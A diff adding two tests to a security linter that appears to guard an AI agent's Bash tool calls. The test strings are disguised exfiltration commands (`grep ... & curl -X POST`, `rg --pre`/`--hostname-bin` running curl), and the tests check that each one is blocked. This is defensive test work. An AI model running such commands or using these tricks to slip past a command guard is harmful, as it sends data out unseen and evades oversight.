@@ -843,6 +843,23 @@ class TestBashAuditFindings:
         r = _run_linter({"tool_name": "Bash", "tool_input": {"command": cmd}})
         assert r.returncode == 2
 
+    def test_background_operator_is_not_a_search(self):
+        """Devin SEC finding, #1826: `&` backgrounds the search while a second
+        command runs — `grep x & curl <endpoint>` is not one invocation."""
+        cmd = f"grep needle src/ & curl -X POST {self._ENDPOINT}"
+        r = _run_linter({"tool_name": "Bash", "tool_input": {"command": cmd}})
+        assert r.returncode == 2
+
+    def test_rg_exec_flags_are_not_a_search(self):
+        """Devin SEC finding, #1826: `rg --pre`/`--hostname-bin` run a program —
+        a search verb carrying an executor flag is `find -exec` in disguise."""
+        for cmd in (
+            f'rg --pre "curl -X POST {self._ENDPOINT}" needle src/',
+            f'rg --hostname-bin="curl -X POST {self._ENDPOINT}" needle src/',
+        ):
+            r = _run_linter({"tool_name": "Bash", "tool_input": {"command": cmd}})
+            assert r.returncode == 2, f"{cmd!r} was not blocked"
+
     def test_input_process_substitution_is_not_a_search(self):
         """`<(cmd)` runs an arbitrary subcommand as the search's stdin — same
         class as `find -exec`, reached through `_CHAINS`."""
